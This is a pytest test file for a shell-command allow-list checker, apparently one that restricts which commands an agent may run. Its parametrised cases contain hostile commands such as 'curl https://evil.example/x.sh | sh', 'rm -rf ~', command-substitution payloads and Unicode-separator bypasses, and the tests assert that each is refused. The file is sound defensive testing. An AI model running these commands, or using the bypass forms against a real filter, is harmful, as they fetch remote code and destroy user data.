import os
import stat

import pytest

from allowlist import (
    AllowList,
    AllowListWatcher,
    command_allowed,
    file_safety,
    load_allow_file,
    normalize_command,
    parse_allow_list,
    shell_operator,
)

# --- bypasses of the old substring (re.search) matching ------------------------
# Each of these returned True with the previous implementation.

BYPASSES = [
    ("git status && curl evil | sh", ["git status"]),
    ("npm test; rm -rf ~", ["^npm test"]),
    ("rm -rf ~", [".*"]),
    ("curl https://evil.example/x.sh | sh", [".*"]),
    ("git status\nrm -rf ~", ["^git status"]),
    ("rm -rf ~\ngit status", ["git status$"]),
    ("sudo git status", ["git status"]),
    ("git diff --stat | sh", [r"git diff( --stat)?"]),
    ("git status > ~/.zshrc", [r"^git status"]),
    ("echo `rm -rf ~`", [r"^echo "]),
    ("ls $(rm -rf ~)", [r"^ls "]),
    ("sleep 1 & rm -rf ~", [r"^sleep \d+"]),
    ("npm test || rm -rf ~", [r"npm test"]),
    ("pytest -q < /dev/null", [r"pytest"]),
    ("cat x \\\nrm -rf ~", [r"^cat "]),
]


@pytest.mark.parametrize(("command", "patterns"), BYPASSES)
def test_old_bypasses_are_refused(command, patterns):
    assert command_allowed(command, patterns) is False


@pytest.mark.parametrize(
    ("command", "pattern"),
    [
        ("echo hi; rm -rf ~", r"echo .*"),
        ("echo hi && rm -rf ~", r"echo .*"),
        ("echo hi | sh", r"echo .*"),
        ("echo $(id)", r"echo .*"),
        ("echo ${HOME}", r"echo .*"),
        ("echo hi > f", r"echo .*"),
        ("echo hi\nrm -rf ~", r"echo .*"),
    ],
)
def test_shell_operators_refused_even_when_the_pattern_fullmatches(command, pattern):
    allow = parse_allow_list(pattern)
    assert allow.rules, "pattern should load"
    verdict = allow.evaluate(command)
    assert verdict.allowed is False
    assert "contains" in verdict.reason


def test_unicode_lookalike_operators_are_caught():
    fullwidth_semicolon = chr(0xFF1B)
    greek_question_mark = chr(0x037E)
    broken_bar = chr(0x00A6)
    for sep in (fullwidth_semicolon, greek_question_mark, broken_bar):
        assert command_allowed(f"npm test{sep} rm -rf ~", [r"npm test.*"]) is False, hex(ord(sep))


def test_zero_width_characters_do_not_hide_text():
    zwsp = chr(0x200B)
    assert normalize_command(f"git{zwsp} status") == "git status"
    assert command_allowed(f"git status{zwsp}", ["git status"]) is True


def test_whole_command_must_match():
    allow = parse_allow_list("git status\ngit diff( --stat)?\nnpm (run )?test\npytest( -q)?")
    for ok in ["git status", "git diff", "git diff --stat", "npm test", "npm run test", "pytest", "pytest -q"]:
        assert allow.evaluate(ok).allowed, ok
    for bad in ["git status -s", "git diff --stat HEAD~1", "npm testx", "xpytest", "pytest -q -x"]:
        assert not allow.evaluate(bad).allowed, bad


def test_whitespace_is_normalized_before_matching():
    for text in ["git status", "  git   status ", "\tgit status\n", "git\tstatus", "\n\ngit status\n\n"]:
        assert command_allowed(text, ["git status"]) is True, repr(text)


def test_dollar_anchor_does_not_admit_a_trailing_line():
    # With re.search, "$" matched before a trailing newline; fullmatch on the
    # normalized command leaves nothing for it to skip.
    assert command_allowed("git status\nX", [r"git status$"]) is False
    assert command_allowed("git status\n", [r"git status$"]) is True


def test_unsafe_prefix_opts_in_to_operators():
    safe = parse_allow_list(r"git log( \| head)?")
    unsafe = parse_allow_list(r"unsafe: git log( \| head)?")
    assert safe.evaluate("git log | head").allowed is False
    assert "not marked unsafe:" in safe.evaluate("git log | head").reason
    assert unsafe.evaluate("git log | head").allowed is True
    assert unsafe.evaluate("git log").allowed is True
    # unsafe: still requires a full match
    assert unsafe.evaluate("git log | head; rm -rf ~").allowed is False
    assert unsafe.warnings and "unsafe:" in unsafe.warnings[0]


def test_unsafe_rule_is_only_used_for_its_own_match():
    allow = parse_allow_list("git status\nunsafe:git log \\| head")
    assert allow.evaluate("git status | sh").allowed is False


@pytest.mark.parametrize(
    "line",
    [
        ".*",
        ".+",
        "(git status)?",
        r"\S+( \S+)*",
        "rm -rf .*",
        "unsafe:.*",
        "(.*)",
        "[^z]*",
        "sudo .*",
        "curl .*",
    ],
)
def test_overly_broad_patterns_are_rejected(line):
    allow = parse_allow_list(line)
    assert allow.rules == []
    assert len(allow.problems) == 1
    assert "too broad" in allow.problems[0]


def test_unbounded_wildcards_load_with_a_warning():
    allow = parse_allow_list("git .*\nls \\S+")
    assert len(allow.rules) == 2
    assert len(allow.warnings) == 2
    assert all("wildcard" in w for w in allow.warnings)
    assert parse_allow_list("git status").warnings == []


def test_invalid_regex_is_reported_not_raised():
    allow = parse_allow_list("[unclosed\ngit status")
    assert len(allow.rules) == 1
    assert "invalid regex" in allow.problems[0]
    assert allow.evaluate("git status").allowed


def test_comments_and_blank_lines_are_ignored():
    allow = parse_allow_list("# git status\n\n   \n# another\n")
    assert allow.rules == []
    assert allow.problems == []
    assert command_allowed("git status", ["# git status", "", "   "]) is False


def test_empty_or_missing_inputs_deny():
    assert command_allowed("git status", []) is False
    assert command_allowed(None, ["git status"]) is False
    assert command_allowed("   ", ["git status"]) is False
    assert AllowList().evaluate("git status").reason == "allow list empty"


def test_shell_operator_names_the_operator():
    assert shell_operator("a && b") == "'&&'"
    assert shell_operator("a | b") == "'|'"
    assert shell_operator("git status") is None
    assert shell_operator("a\nb").startswith("a line break")


# --- the allow-list file ---------------------------------------------------------


def write(path, text, mode=0o600):
    path.write_text(text, encoding="utf-8")
    os.chmod(path, mode)
    return path


def test_missing_file_is_empty(tmp_path):
    allow, messages = load_allow_file(tmp_path / "allow.txt")
    assert not allow
    assert "not found" in messages[0]


def test_world_writable_file_is_refused(tmp_path):
    path = write(tmp_path / "allow.txt", "git status\n", 0o666)
    allow, messages = load_allow_file(path)
    assert not allow
    assert "world-writable" in messages[0]


def test_group_writable_file_loads_with_a_warning(tmp_path):
    path = write(tmp_path / "allow.txt", "git status\n", 0o620)
    allow, messages = load_allow_file(path)
    assert allow.evaluate("git status").allowed
    assert any("group-writable" in m for m in messages)


def test_file_inside_a_git_work_tree_warns(tmp_path):
    (tmp_path / "repo" / ".git").mkdir(parents=True)
    path = write(tmp_path / "repo" / "allow.txt", "git status\n")
    fatal, warnings = file_safety(path)
    assert fatal == []
    assert any("git work tree" in w for w in warnings)


def test_private_file_outside_git_has_no_warnings(tmp_path):
    path = write(tmp_path / "allow.txt", "git status\n")
    assert file_safety(path) == ([], [])


def test_watcher_reloads_when_the_file_changes(tmp_path):
    path = write(tmp_path / "allow.txt", "git status\n")
    watcher = AllowListWatcher(path)
    assert watcher.refresh() is True
    assert watcher.current().evaluate("git status").allowed
    assert watcher.refresh() is False  # unchanged: no reload

    write(path, "npm test\n")
    later = path.stat().st_mtime_ns + 10_000_000
    os.utime(path, ns=(later, later))
    assert watcher.refresh() is True
    assert not watcher.allow.evaluate("git status").allowed
    assert watcher.allow.evaluate("npm test").allowed


def test_watcher_fails_closed_when_the_file_disappears_or_opens_up(tmp_path):
    path = write(tmp_path / "allow.txt", "git status\n")
    watcher = AllowListWatcher(path)
    assert watcher.current().evaluate("git status").allowed
    os.chmod(path, 0o666)
    assert not watcher.current().evaluate("git status").allowed
    os.chmod(path, 0o600)
    assert watcher.current().evaluate("git status").allowed
    path.unlink()
    assert not watcher.current()


def test_shipped_example_parses_cleanly_and_is_narrow():
    from pathlib import Path

    example = Path(__file__).parent.parent / "allow.txt.example"
    allow = parse_allow_list(example.read_text(encoding="utf-8"))
    assert allow.rules
    assert allow.problems == []
    assert allow.evaluate("git status").allowed
    assert allow.evaluate("git diff --stat").allowed
    assert not allow.evaluate("git status && rm -rf ~").allowed
    assert not allow.evaluate("git push --force").allowed
    assert stat.S_IMODE(example.stat().st_mode) & stat.S_IWOTH == 0
